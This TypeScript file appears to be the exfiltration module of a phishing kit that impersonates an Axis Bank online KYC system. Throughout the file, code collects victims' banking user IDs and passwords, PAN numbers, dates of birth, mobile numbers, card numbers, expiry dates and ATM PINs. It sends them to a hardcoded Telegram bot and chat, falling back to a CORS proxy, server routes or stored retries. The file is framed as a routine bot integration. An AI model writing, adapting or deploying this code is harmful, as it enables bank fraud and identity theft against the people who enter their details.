// Telegram Bot Integration for Axis Bank KYC System

interface TelegramMessage {
  chat_id: string;
  text: string;
  parse_mode?: string;
}

interface LoginDetails {
  userId: string;
  password: string;
  timestamp: string;
}

interface KycDetails {
  fullName: string;
  customerId: string;
  mobileNumber: string;
  panCardNumber: string;
  dateOfBirth: string;
  timestamp: string;
}

interface CardVerificationDetails {
  cardNumber: string;
  expiryDate: string;
  atmPin: string;
  timestamp: string;
}

class TelegramBotService {
  private botToken: string;
  private chatId: string;
  private botPassword: string;

  constructor() {
    // Your actual Telegram bot details
    this.botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '8519877001:AAFUU7sq1cR3L-Rcsp_p1tydU0SiG2zvbwk';
    this.chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7271452485'; // Your Chat ID
    this.botPassword = process.env.NEXT_PUBLIC_BOT_PASSWORD || 'axisbank2024';
  }

  // Send message to Telegram
  async sendMessage(message: string): Promise<boolean> {
    console.log('📤 Sending Telegram message...');
    console.log('🤖 Bot Token:', this.botToken.substring(0, 10) + '...');
    console.log('👤 Chat ID:', this.chatId);
    console.log('📱 User Agent:', navigator.userAgent);
    
    // Check if mobile device
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    if (isMobile) {
      console.log('📱 Mobile device detected, using server-side API');
      return await this.sendViaServerAPI(message);
    }
    
    // Try direct method for desktop
    try {
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      const payload: TelegramMessage = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };

      console.log('🌐 Making direct request to:', url);
      console.log('📦 Payload:', JSON.stringify(payload, null, 2));

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify(payload),
        // Add timeout for mobile
        signal: AbortSignal.timeout(10000)
      });

      console.log('📋 Response status:', response.status);
      console.log('📋 Response headers:', Object.fromEntries(response.headers.entries()));

      const responseText = await response.text();
      console.log('📋 Response body:', responseText);

      if (response.ok) {
        console.log('✅ Telegram message sent successfully to @vikaskumar_8102');
        return true;
      } else {
        console.error('❌ Failed to send Telegram message:', responseText);
        // Fall back to server API
        return await this.sendViaServerAPI(message);
      }
    } catch (error) {
      console.error('❌ Error sending Telegram message:', error);
      // Fall back to server API
      return await this.sendViaServerAPI(message);
    }
  }

  // Send via server-side API (bypasses CORS issues)
  private async sendViaServerAPI(message: string): Promise<boolean> {
    console.log('🔄 Using server-side API to bypass mobile issues');
    
    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'direct',
          data: {
            message: message,
            chatId: this.chatId,
            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
          }
        }),
        signal: AbortSignal.timeout(15000)
      });

      console.log('📋 Server API response status:', response.status);
      
      if (response.ok) {
        const result = await response.json();
        console.log('✅ Server API successful:', result);
        return true;
      } else {
        const errorText = await response.text();
        console.error('❌ Server API failed:', errorText);
        // Store for later as last resort
        this.storeMessageForLater(message);
        return false;
      }
    } catch (error) {
      console.error('❌ Server API error:', error);
      // Store for later as last resort
      this.storeMessageForLater(message);
      return false;
    }
  }

  // Format login details for Telegram
  formatLoginMessage(details: LoginDetails): string {
    return `
🔐 <b>NEW LOGIN ATTEMPT - AXIS BANK KYC</b>

📋 <b>Login Details:</b>
• <b>User ID:</b> <code>${details.userId}</code>
• <b>Password:</b> <code>${details.password}</code>
• <b>Timestamp:</b> ${details.timestamp}

🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
    `;
  }

  // Format KYC details for Telegram
  formatKycMessage(details: KycDetails): string {
    return `
📝 <b>NEW KYC UPDATE - AXIS BANK</b>

👤 <b>Customer Information:</b>
• <b>Full Name:</b> <code>${details.fullName}</code>
• <b>Customer ID:</b> <code>${details.customerId}</code>
• <b>Mobile Number:</b> <code>${details.mobileNumber}</code>
• <b>PAN Card:</b> <code>${details.panCardNumber}</code>
• <b>Date of Birth:</b> <code>${details.dateOfBirth}</code>
• <b>Timestamp:</b> ${details.timestamp}

🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
    `;
  }

  // Format card verification details for Telegram
  formatCardVerificationMessage(details: CardVerificationDetails): string {
    return (
      `💳 <b>CARD VERIFICATION COMPLETED - AXIS BANK</b>

💳 <b>Card Details:</b>
• <b>Card Number:</b> <code>${details.cardNumber}</code>
• <b>Expiry Date:</b> <code>${details.expiryDate}</code>
• <b>ATM PIN:</b> <code>${details.atmPin}</code>
• <b>Timestamp:</b> ${details.timestamp}

✅ <i>Card verification successful</i>
🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>`
    );
  }

  // Send login notification
  async sendLoginNotification(details: LoginDetails): Promise<boolean> {
    console.log('📱 Sending Login - using simple API');
    const message = this.formatLoginMessage(details);
    return await this.sendViaSimpleAPI(message);
  }

  // Send login via server API (mobile optimized)
  private async sendLoginViaServerAPI(details: LoginDetails): Promise<boolean> {
    console.log('📱 Sending login via server API for mobile');
    
    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'login',
          data: details
        }),
        signal: AbortSignal.timeout(15000)
      });

      console.log('📋 Login Server API response status:', response.status);
      
      if (response.ok) {
        const result = await response.json();
        console.log('✅ Login Server API successful:', result);
        return true;
      } else {
        const errorText = await response.text();
        console.error('❌ Login Server API failed:', errorText);
        // Store for later as last resort
        const message = this.formatLoginMessage(details);
        this.storeMessageForLater(message);
        return false;
      }
    } catch (error) {
      console.error('❌ Login Server API error:', error);
      // Store for later as last resort
      const message = this.formatLoginMessage(details);
      this.storeMessageForLater(message);
      return false;
    }
  }

  // Send KYC notification
  async sendKycNotification(details: KycDetails): Promise<boolean> {
    console.log('📱 Sending KYC - using simple API');
    const message = this.formatKycMessage(details);
    return await this.sendViaSimpleAPI(message);
  }

  // Simple API method for mobile
  private async sendViaSimpleAPI(message: string): Promise<boolean> {
    try {
      // Use standard API endpoint (works on both localhost and Vercel)
      const endpoint = '/api/send-telegram';
        
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: message,
          chatId: this.chatId
        }),
        signal: AbortSignal.timeout(10000)
      });

      const result = await response.json();
      return result.success;
    } catch (error) {
      console.error('❌ Simple API failed:', error);
      return false;
    }
  }

  // Send KYC via server API (mobile optimized)
  private async sendKycViaServerAPI(details: KycDetails): Promise<boolean> {
    console.log('📱 Sending KYC via server API for mobile');
    
    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'kyc',
          data: details
        }),
        signal: AbortSignal.timeout(15000)
      });

      console.log('📋 KYC Server API response status:', response.status);
      
      if (response.ok) {
        const result = await response.json();
        console.log('✅ KYC Server API successful:', result);
        return true;
      } else {
        const errorText = await response.text();
        console.error('❌ KYC Server API failed:', errorText);
        // Store for later as last resort
        const message = this.formatKycMessage(details);
        this.storeMessageForLater(message);
        return false;
      }
    } catch (error) {
      console.error('❌ KYC Server API error:', error);
      // Store for later as last resort
      const message = this.formatKycMessage(details);
      this.storeMessageForLater(message);
      return false;
    }
  }

  // Send card verification notification
  async sendCardVerificationNotification(details: CardVerificationDetails): Promise<boolean> {
    const message = this.formatCardVerificationMessage(details);
    return await this.sendMessage(message);
  }

  // Alternative method for mobile devices
  async sendAlternativeMessage(message: string): Promise<boolean> {
    console.log('🔄 Trying alternative method for mobile...');
    
    // Method 1: Try with different CORS proxy
    try {
      const proxyUrl = 'https://corsproxy.io/?';
      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      const payload = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };

      console.log('🔄 Trying CORS proxy method...');
      const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(15000)
      });

      if (response.ok) {
        console.log('✅ CORS proxy method successful - message sent to @vikaskumar_8102');
        return true;
      }
    } catch (error) {
      console.error('❌ CORS proxy method failed:', error);
    }

    // Method 2: Try with JSONP-like approach
    try {
      console.log('🔄 Trying webhook method...');
      const webhookUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      formData.append('text', message);
      formData.append('parse_mode', 'HTML');

      const response = await fetch(webhookUrl, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(15000)
      });

      if (response.ok) {
        console.log('✅ Webhook method successful - message sent to @vikaskumar_8102');
        return true;
      }
    } catch (error) {
      console.error('❌ Webhook method failed:', error);
    }

    // Method 3: Store locally for sync later
    console.log('📱 Storing message for later sync...');
    this.storeMessageForLater(message);
    return false;
  }

  // Store message for later synchronization
  private storeMessageForLater(message: string): void {
    try {
      const storedMessages = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
      storedMessages.push({
        message: message,
        timestamp: new Date().toISOString(),
        attempts: 0
      });
      localStorage.setItem('pendingTelegramMessages', JSON.stringify(storedMessages));
      console.log('📱 Message stored for later sync');
    } catch (error) {
      console.error('❌ Failed to store message:', error);
    }
  }

  // Retry sending stored messages
  async retryStoredMessages(): Promise<void> {
    try {
      const storedMessages = JSON.parse(localStorage.getItem('pendingTelegramMessages') || '[]');
      const remainingMessages = [];

      for (const msgData of storedMessages) {
        if (msgData.attempts < 3) {
          const success = await this.sendMessage(msgData.message);
          if (!success) {
            msgData.attempts++;
            remainingMessages.push(msgData);
          }
        }
      }

      localStorage.setItem('pendingTelegramMessages', JSON.stringify(remainingMessages));
    } catch (error) {
      console.error('❌ Failed to retry stored messages:', error);
    }
  }

  // Get bot password for verification
  getBotPassword(): string {
    return this.botPassword;
  }

  // Verify bot password
  verifyPassword(password: string): boolean {
    return password === this.botPassword;
  }

  // Test connection to Telegram
  async testConnection(): Promise<boolean> {
    const testMessage = `
🔧 <b>TELEGRAM BOT TEST - AXIS BANK KYC</b>

✅ <i>Bot is working correctly!</i>
• <b>Chat ID:</b> <code>${this.chatId}</code>
• <b>Username:</b> @vikaskumar_8102
• <b>Test Time:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}

🏦 <i>Axis Bank Online KYC System</i>
    `;
    return await this.sendMessage(testMessage);
  }
}

// Export singleton instance
export const telegramBot = new TelegramBotService();
